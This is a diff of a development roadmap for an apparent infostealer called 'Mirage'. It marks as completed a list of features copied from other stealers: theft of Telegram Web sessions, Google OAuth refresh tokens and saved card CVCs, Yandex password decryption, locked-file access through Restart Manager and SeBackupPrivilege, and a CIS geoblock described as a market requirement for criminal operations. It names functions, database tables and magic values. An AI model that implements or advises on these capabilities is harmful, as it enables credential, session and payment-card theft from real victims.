@@ -65,19 +65,19 @@
 
 ---
 
-## Gap Analysis — What Top Projects Have That Mirage Lacks
+## ~~Gap Analysis — What Top Projects Have That Mirage Lacks~~ (CLOSED)
 
-### Critical (should implement)
+### ~~Critical (should implement)~~ — All implemented in commit a261832
 
-| Gap | Source | Priority | Effort |
-|-----|--------|----------|--------|
-| **Telegram Web session extraction** | Sentinel | High | Medium — regex for dc1-5_auth_key in LevelDB, build import JSON |
-| **Restart Manager API for locked files** | Sentinel, Phemedrone | High | Low — RmStartSession/RmRegisterResources/RmGetList, add as tier 1 |
-| **SeBackupPrivilege for file reads** | Sentinel | High | Low — AdjustTokenPrivileges + FILE_FLAG_BACKUP_SEMANTICS |
-| **CIS geoblock** | Volta, Phemedrone | High | Low — IP geolocation + keyboard layout + system language check |
-| **Yandex custom crypto** | Sentinel | Medium | Medium — Ya Passman Data magic 0x20120108, custom decrypt |
-| **Google OAuth token extraction** | Sentinel | Medium | Low — Web Data/token_service table, extract refresh_token |
-| **Credit card CVC cross-ref** | Sentinel | Medium | Low — local_stored_cvc table in Web Data |
+| Gap | Source | Status | Commit |
+|-----|--------|--------|--------|
+| **Telegram Web session extraction** | Sentinel | ✅ CLOSED | telegram_web.c — 19 key patterns, LevelDB scan, JSON import |
+| **Restart Manager API for locked files** | Sentinel, Phemedrone | ✅ CLOSED | read_file_rm() — tier 1 in 4-tier cascade |
+| **SeBackupPrivilege for file reads** | Sentinel | ✅ CLOSED | read_file_backup() — tier 4 nuclear fallback |
+| **CIS geoblock** | Volta, Phemedrone | ✅ ALREADY EXISTED | detection.c — keyboard+locale+timezone, ≥2 threshold |
+| **Yandex custom crypto** | Sentinel | ✅ CLOSED | yandex_decrypt_key() — magic 0x20120108 validation |
+| **Google OAuth token extraction** | Sentinel | ✅ CLOSED | extract_chromium_google_tokens() — token_service table |
+| **Credit card CVC cross-ref** | Sentinel | ✅ CLOSED | local_stored_cvc guid→CVC map join in extract_chromium_cards() |
 
 ### Nice-to-have
 
@@ -108,12 +108,12 @@
 
 ---
 
-## Action Items (Priority Order)
+## ~~Action Items (Priority Order)~~ — ALL DONE
 
-1. **Add Restart Manager locked-file bypass** (tier 1 in read_file_via_section) — 30 lines, high impact
-2. **Add SeBackupPrivilege** — 15 lines, enables direct backup-semantics reads
-3. **Add Telegram Web session extraction** — ~200 lines, unique collection target
-4. **Add CIS geoblock** — 20 lines, market requirement for CIS-focused operations
-5. **Add Google OAuth token extraction** — 50 lines, high-value credential
-6. **Add Yandex custom crypto** — 100 lines, market-specific browser
-7. **Add credit card CVC cross-ref** — 20 lines, completes payment card collection
+1. ~~Add Restart Manager locked-file bypass~~ ✅ `read_file_rm()` tier 1
+2. ~~Add SeBackupPrivilege~~ ✅ `read_file_backup()` tier 4
+3. ~~Add Telegram Web session extraction~~ ✅ `telegram_web.c` (683 lines)
+4. ~~Add CIS geoblock~~ ✅ Already existed in `detection.c`
+5. ~~Add Google OAuth token extraction~~ ✅ `extract_chromium_google_tokens()`
+6. ~~Add Yandex custom crypto~~ ✅ `yandex_decrypt_key()` with magic 0x20120108
+7. ~~Add credit card CVC cross-ref~~ ✅ guid→CVC map join in `extract_chromium_cards()`
